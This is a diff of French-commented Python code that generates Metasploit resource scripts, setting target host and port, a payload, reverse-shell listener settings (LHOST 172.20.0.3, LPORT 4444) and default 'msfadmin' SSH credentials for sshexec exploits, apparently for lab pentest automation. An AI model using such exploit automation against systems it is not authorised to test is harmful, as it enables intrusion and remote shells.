@@ -982,13 +982,15 @@ set RHOSTS {target}
 set RPORT {port}
 """
         
-        # ✅ CORRECTION UNIQUE: LHOST sur toutes interfaces pour éviter l'erreur de bind
-        script += f"set LHOST 172.20.0.3\n"
-        script += f"set LPORT {options.get('LPORT', '4444')}\n"
+        payload = options.get('PAYLOAD', 'cmd/unix/interact')
         
-        # ✅ AMÉLIORATION: Log pour debug
-        logger.info(f"🔧 LHOST configuré sur 172.20.0.3")
-        logger.info(f"🔧 LPORT configuré à: {options.get('LPORT', '4444')}")
+        # ✅ LHOST/LPORT seulement pour les payloads reverse
+        if 'reverse' in payload.lower() or 'meterpreter' in payload.lower():
+            script += f"set LHOST 172.20.0.3\n"
+            script += f"set LPORT {options.get('LPORT', '4444')}\n"
+        
+        # ✅ TOUJOURS définir le payload en premier
+        script += f"set PAYLOAD {payload}\n"
         
         # ✅ GESTION SPÉCIALE POUR SSH EXPLOITS
         if 'ssh' in exploit_module.lower():
@@ -996,10 +998,7 @@ set RPORT {port}
             if 'sshexec' in exploit_module:
                 script += f"set USERNAME {options.get('USERNAME', 'msfadmin')}\n"
                 script += f"set PASSWORD {options.get('PASSWORD', 'msfadmin')}\n"
-                
-                # Payload par défaut pour SSH
-                payload = options.get('PAYLOAD', 'linux/x64/shell/reverse_tcp')
-                script += f"set PAYLOAD {payload}\n"
+
         
         # ✅ GESTION POUR SMB EXPLOITS
         elif 'smb' in exploit_module.lower():
